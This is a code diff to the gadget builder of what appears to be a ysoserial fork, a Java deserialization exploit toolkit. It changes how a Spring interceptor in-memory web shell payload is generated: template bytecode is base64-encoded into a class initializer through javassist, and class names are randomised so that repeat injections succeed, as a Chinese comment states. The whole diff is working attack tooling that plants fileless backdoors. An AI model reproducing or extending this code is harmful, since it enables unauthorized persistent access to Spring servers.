@@ -11,9 +11,9 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import org.apache.commons.codec.binary.Base64;
 import org.apache.wicket.util.file.Files;
-import sun.misc.BASE64Encoder;
-import ysoserial.payloads.templates.SpringInterceptorTemplate;
+import ysoserial.payloads.templates.SpringInterceptorMemShell;
 
 import java.io.File;
 import java.io.Serializable;
@@ -114,17 +114,19 @@ public class Gadgets {
         if (myClass != null) {
             // CLASS:
             if (myClass.getName().contains("SpringInterceptorMemShell")) {
+                // memShellClazz
                 ctClass = pool.get(myClass.getName());
                 // 修改b64字节码
-                String encode = BASE64Encoder.class.newInstance().encode(ClassFiles.classAsBytes(SpringInterceptorTemplate.class)).replaceAll("\n", "");
+                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
+                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
+                springTemplateClass.setName(clazzName);
+                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                 String b64content = "b64=\"" + encode + "\";";
                 ctClass.makeClassInitializer().insertBefore(b64content);
                 // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
-                String clazzName = "ysoserial.payloads.templates.SpringInterceptorMemShell" + System.nanoTime();
                 String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                 ctClass.makeClassInitializer().insertBefore(clazzNameContent);
-                ctClass.setName(clazzName);
-
+                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
                 ctClass.setSuperclass(superC);
                 classBytes = ctClass.toBytecode();
             } else {
